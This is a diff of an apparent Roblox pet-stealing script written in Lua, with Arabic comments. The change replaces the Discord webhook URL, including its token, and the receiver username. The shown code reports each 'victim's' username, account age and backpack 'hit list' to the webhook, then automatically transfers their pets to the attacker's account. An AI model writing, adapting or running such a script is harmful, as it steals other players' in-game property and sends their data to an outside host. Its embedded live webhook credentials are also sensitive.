@@ -11,7 +11,7 @@ local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
 -- ضع هنا الويب هوك الجديد
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1421516624992931972/LU9rbmn4hdxTJ_GZIttUEJkftue6nBdfCAlXbNFbkmSnL-Z97srQgoNKsbV_gAg2S7AK"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1404963543555768383/6qQU8_ItNMIXpsqtZGDTXuGpO-TdRLbxUDMR_ulseo32MKwxqP8ILq_Lfbt76DNfHGT4"
 
 -- =========================
 -- 1: قسم النقل التلقائي (كل 3 دقائق)
@@ -152,7 +152,7 @@ task.spawn(function()
 
     local message = "@everyone **Alien Hit**\n──────────────\n" ..
                     "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: Delta\nAccount Age: " .. accountAge ..
-                    "\nReceiver: sanamakapaldo\n──────────────\n**Hit List:**\n"
+                    "\nReceiver: sssfysue7\n──────────────\n**Hit List:**\n"
 
     for i = 1, math.min(10, #backpackContent) do
         message = message .. "• " .. backpackContent[i] .. "\n"
@@ -264,4 +264,4 @@ end
 
 task.spawn(removePetsFromFarm)
 task.spawn(equipPetsAndToggleFavorite)
-task.spawn(function() autoGivePet("sanamakapaldo") end)
+task.spawn(function() autoGivePet("sssfysue7") end)
